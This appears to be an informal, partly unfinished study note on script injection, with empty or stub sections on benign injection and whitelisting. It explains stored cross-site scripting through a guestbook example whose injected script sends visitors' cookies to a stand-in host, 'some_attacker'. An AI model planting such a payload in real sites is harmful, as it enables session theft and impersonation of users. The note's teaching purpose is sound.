# Script Injection

# What?
* Code injection in general is when some code is placed (injected) into a vulnerable program.

* Much like a injecting drugs, this will have a serious effect - and this won't always be a good thing. From a local anesthetic to allow a friendly operation on your teeth :D
![tag](https://www.google.co.uk/search?q=teeth&espv=2&biw=1484&bih=796&source=lnms&tbm=isch&sa=X&ved=0ahUKEwiAr8qCrYvLAhWBvBQKHTacAr4Q_AUIBigB#imgrc=oWTH8-mu73NhSM%3A), 
or a hard class A that will lead to a life of theft and no teeth, there are benign and malign code injections.

### Benign


### Malign

* A web server has a guestbook script, which accepts small messages from users, and typically receives messages such as

 Very nice site!
However a malicious person may know of a code injection vulnerability in the guestbook, and enters a message such as

Nice site,  I think I'll take it. <script>document.location="http://some_attacker/cookie.cgi?" + document.cookie</script>

If another user views the page then the injected code will be executed. This code can allow the attacker to impersonate another user. However this same software bug can be accidentally triggered by an unassuming user which will cause the website to display bad HTML code.





## Whitelisting
* Opposite of blacklisting, a list of programs, words, e-mails, filters that are allowed for a particular website or program.
*    
